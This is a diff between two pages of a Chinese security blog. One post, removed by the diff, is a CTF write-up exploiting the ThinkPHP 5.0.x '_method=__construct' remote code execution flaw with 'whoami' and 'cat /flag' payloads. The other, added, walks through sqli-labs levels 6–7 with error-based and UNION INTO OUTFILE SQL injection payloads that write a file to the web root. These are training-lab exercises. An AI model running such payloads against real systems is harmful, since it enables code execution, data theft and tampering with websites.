@@ -3,26 +3,32 @@
 <head>
   <meta charset="utf-8">
   
-  <title>25-buu练习[BJDCTF 2nd]old-hack 1 | baba童鞋的博客</title>
+  <title>sqli-labs靶场6-7 | baba童鞋的博客</title>
 
   <!-- keywords -->
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="知识点 ThinkPHP  ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架，是为了敏捷WEB应用开发和简化企 业应用开发而诞生的。由于其简单易用，国内用户众多。2019年1月11日ThinkPHP团队发布了版本更新，本次更新包含了一个可能GetShell的安全更新，具体内容为改进Request类的method方法。漏洞描述Thinphp团队在实现框架中的核心类Requ">
+  <meta name="description" content="知识点 outfile语句  这里需要注意的是outfile语句在MySql中，into outfile函数的权限是很容易忽略的一个点，其中涉及到了几个关键的变量，分别是secure_file_priv, datadir 和 PrivateTmp。下面简单介绍一下这三个变量。（1）secure_file_priv这个参数主要用来限制数据的导入导出效果（load data, into outfile">
 <meta property="og:type" content="article">
-<meta property="og:title" content="25-buu练习[BJDCTF 2nd]old-hack 1">
-<meta property="og:url" content="http://example.com/2021/02/15/hack/index.html">
+<meta property="og:title" content="sqli-labs靶场6-7">
+<meta property="og:url" content="http://example.com/2021/02/22/bc/index.html">
 <meta property="og:site_name" content="baba童鞋的博客">
-<meta property="og:description" content="知识点 ThinkPHP  ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架，是为了敏捷WEB应用开发和简化企 业应用开发而诞生的。由于其简单易用，国内用户众多。2019年1月11日ThinkPHP团队发布了版本更新，本次更新包含了一个可能GetShell的安全更新，具体内容为改进Request类的method方法。漏洞描述Thinphp团队在实现框架中的核心类Requ">
+<meta property="og:description" content="知识点 outfile语句  这里需要注意的是outfile语句在MySql中，into outfile函数的权限是很容易忽略的一个点，其中涉及到了几个关键的变量，分别是secure_file_priv, datadir 和 PrivateTmp。下面简单介绍一下这三个变量。（1）secure_file_priv这个参数主要用来限制数据的导入导出效果（load data, into outfile">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2021/02/15/hack/g0.png">
-<meta property="og:image" content="http://example.com/2021/02/15/hack/g.png">
-<meta property="article:published_time" content="2021-02-15T11:56:57.000Z">
-<meta property="article:modified_time" content="2021-02-15T12:16:36.099Z">
+<meta property="og:image" content="http://example.com/2021/02/22/bc/b1.png">
+<meta property="og:image" content="http://example.com/2021/02/22/bc/b2.png">
+<meta property="og:image" content="http://example.com/2021/02/22/bc/b3.png">
+<meta property="og:image" content="http://example.com/2021/02/22/bc/b4.png">
+<meta property="og:image" content="http://example.com/2021/02/22/bc/c1.png">
+<meta property="og:image" content="http://example.com/2021/02/22/bc/c2.png">
+<meta property="og:image" content="http://example.com/2021/02/22/bc/c3.png">
+<meta property="og:image" content="http://example.com/2021/02/22/bc/c4.png">
+<meta property="article:published_time" content="2021-02-22T05:11:15.000Z">
+<meta property="article:modified_time" content="2021-02-22T06:34:11.560Z">
 <meta property="article:author" content="Jialu">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2021/02/15/hack/g0.png">
+<meta name="twitter:image" content="http://example.com/2021/02/22/bc/b1.png">
   
     <link rel="alternative" href="/atom.xml" title="baba童鞋的博客" type="application/atom+xml">
   
@@ -174,11 +180,11 @@
 		</header>				
 	</div>
 </nav>
-      <div class="body-wrap"><article id="post-hack" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-bc" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2021/02/15/hack/" class="article-date">
-  	<time datetime="2021-02-15T11:56:57.000Z" itemprop="datePublished">2021-02-15</time>
+      <a href="/2021/02/22/bc/" class="article-date">
+  	<time datetime="2021-02-22T05:11:15.000Z" itemprop="datePublished">2021-02-22</time>
 </a>
     </div>
   
@@ -191,7 +197,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      25-buu练习[BJDCTF 2nd]old-hack 1
+      sqli-labs靶场6-7
       
     </h1>
   
@@ -209,38 +215,46 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2>知识点</h2>
-<h3>ThinkPHP</h3>
+        <h1>知识点</h1>
+<h3>outfile语句</h3>
 
-<p><b>ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架，是为了敏捷WEB应用开发和简化企 业应用开发而诞生的。由于其简单易用，国内用户众多。</b><br>2019年1月11日ThinkPHP团队发布了版本更新，本次更新包含了一个可能GetShell的安全更新，具体内容为改进Request类的method方法。<br><b style="color:pink">漏洞描述</b><br>Thinphp团队在实现框架中的核心类Requests的method方法实现了表单请求类型伪装，默认为$_POST[‘_method’]变量，却没有对$_POST[‘_method’]属性进行严格校验，可以通过变量覆盖掉Requets类的属性并结合框架特性实现对任意函数的调用达到任意代码执行的效果。<br><b style="color:pink">漏洞危害</b><br>在未经授权的情况下远程攻击者构造特殊的请求可以在PHP上下文环境中执行任意系统命令，甚至完全控制网站，造成数据泄露，网站内容被修改。<br><b style="color:pink">影响范围</b><br>受影响版本：ThinkPHP 5.0.x<br>不受影响版本：ThinkPHP 5.0.24<br>在修复前的文件526行中，当存在$_POST[‘_method’]变量是将会执行 $this-&gt;{$this-&gt;method}($_POST)，当$_POST[‘_method’]为__construct时及等价于调用$this-&gt;_construct($_POST)_construct函数实现如下：<br><b style="color:pink">漏洞分析</b><br>在该函数中，当传入的参数中的key为该Requests属性，将value赋值给该属性，由于key可控制，可以到达属性覆盖的效果。<br><b style="color:pink">漏洞复现</b><br>通过git 可以快速搭建环境</p>
+<p>这里需要注意的是outfile语句在MySql中，into outfile函数的权限是很容易忽略的一个点，其中涉及到了几个关键的变量，分别是secure_file_priv, datadir 和 PrivateTmp。下面简单介绍一下这三个变量。<br>（1）secure_file_priv<br>这个参数主要用来限制数据的导入导出效果（load data, into outfile等）。如果这个参数值为NULL，那么mysql会禁止用户进行导入导出操作；如果这个参数是一个具体的目录名，那么数据的导入导出只能在该目录下进行；如果这个参数为空，那么导入导出的文件位置将不受限制。<br>该参数的设置，可以在my.cnf配置文件中修改，而在搭建的SQLi-Labs环境中下需要在配置的phpstudy环境中修改，具体修改方法因配置环境而异，此处不作讲解。<br>（2）datadir<br>这个参数是MySql存放数据文件的目录，也是导入导出操作的相对路径<br>（3）PrivateTmp<br>使用Systemd进程作为启动进程的linux系统，其子进程都会有一个属性叫PrivateTmp，用于设置是否使用私有的tmp目录。</p>
+<h1>Less-6</h1>
+<h3>界面</h3>
+
+<p><img src="/2021/02/22/bc/b1.png"></p>
+<h3>测试</h3>
+
+<p>通过测试可知：?id=1”<br><img src="/2021/02/22/bc/b2.png"></p>
 <ul>
-<li>git clone https://github.com/top-think/think
-</li><li>
-git checkout v5.0.23
-</li><li>
-cd think
-</li><li>
-git clone https://github.com/top-think/framework thinkphp
-</li><li>
-cd thinkphp
-</li><li>
-git checkout v5.0.23
+<li>url + ?id=1" order by 4--+ //报错
 </li></ul>
 
-<p>通过覆盖filter属性即可达到调用任意函数的效果。<br>Payload如下</p>
+<p><img src="/2021/02/22/bc/b3.png"><br>可知字段数为3，页面有布尔类型状态，所以用布尔盲注，页面没有回显不能用联合查询，页面没有报错信息不能用报错注入。<br>其余步骤和第五关的一模一样，只是将单引号变为双引号<br>最终payload：?id=1” and extractvalue(1,concat(0x23,(select username from users order by id limit 2,1),0x23))–+<br>得到所有数据：<br><img src="/2021/02/22/bc/b4.png"></p>
+<h1>Less-7</h1>
+<h3>界面</h3>
+
+<p><img src="/2021/02/22/bc/c1.png"></p>
+<h3>测试</h3>
+
+<p>首先，按照提示输入id参数，尝试寻找注入点<br>构建url: …/Less-7/?id=1<br><img src="/2021/02/22/bc/c2.png"><br>页面显示正常，提示使用outfile语句<br>构建url：…/Less-7/?id=1’<br><img src="/2021/02/22/bc/c3.png"><br>页面报错，但是没有提示报错信息,网站存在注入点,通过不断尝试，我们猜测到了原有sql语句的闭合方式<br>构建url：…/Less-7/?id=1’)) –+<br>页面显示正常<br>那么可以使用union联合查询构造语句：</p>
 <ul>
-<li>_method=__construct&filter[]=system&server[REQUEST_METHOD]=whoami
+<li>../Less-7/?id=1")) union select 1,2,3 --(( "
 </li></ul>
 
-<p>在早期5.0的版本过滤器的调用有差别payload也会不同<br>更详细内容参见；<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuzly/p/11460285.html">https://www.cnblogs.com/yuzly/p/11460285.html</a></p>
-<h2>题目</h2>
-
-<p>打开靶场<br><img src="/2021/02/15/hack/g0.png"><br>题目提示是thinkphp5<br>百度发现thinkphp5有原厂命令执行漏洞，详情在知识点中有多描述<br>构造payload：</p>
+<p>此时的查询语句；select * from users where id=((‘1’)) union select 1,2,3 –(( ‘)<br>在linux中，网站一般是放在/var/www/html目录里，这里我们dump一个文件到这个目录，名字是hacker.txt。<br>构造语句：</p>
 <ul>
-<li>_method=__construct&filter[]=system&server[REQUEST_METHOD]=cat /flag
+<li>../Less-7/?id=1')) union select 1,'hacker by xuxinhen',3 into outfile '/var/www/html/hacker.txt' -- (( '
 </li></ul>
 
-<p><img src="/2021/02/15/hack/g.png"><br>得到flag~~</p>
+<p><img src="/2021/02/22/bc/c4.png"><br>虽然报错，但是文件已经生成</p>
+<p>打开链接：</p>
+<p>…/hacker.txt即可找到</p>
+<p>此时的sql语句为：</p>
+<ul>
+<li>select * from users where id=(('1')) union select 1,'hacker by xuxinhen',3 into outfile '/var/www/html/hacker.txt' -- (( '
+</li></ul>
+
 
       
     </div>
@@ -250,18 +264,9 @@ git checkout v5.0.23
     
 <nav id="article-nav">
   
-    <a href="/2021/02/22/bc/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">&lt;</strong>
-      <div class="article-nav-title">
-        
-          sqli-labs靶场6-7
-        
-      </div>
-    </a>
   
-  
-    <a href="/2021/02/14/guge/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">24-buu练习[BJDCTF 2nd]fake google 1</div>
+    <a href="/2021/02/15/hack/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">25-buu练习[BJDCTF 2nd]old-hack 1</div>
       <strong class="article-nav-caption">&gt;</strong>
     </a>
   
@@ -271,7 +276,7 @@ git checkout v5.0.23
 </article>
 
 
-<div class="ds-share share" data-thread-key="hack" data-title="25-buu练习[BJDCTF 2nd]old-hack 1" data-url="http://example.com/2021/02/15/hack/"  data-images="/img/huahua.jpg" data-content="25-buu练习[BJDCTF 2nd]old-hack 1">
+<div class="ds-share share" data-thread-key="bc" data-title="sqli-labs靶场6-7" data-url="http://example.com/2021/02/22/bc/"  data-images="/img/huahua.jpg" data-content="sqli-labs靶场6-7">
     <div class="ds-share-inline">
       <ul  class="ds-share-icons-16">
       	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
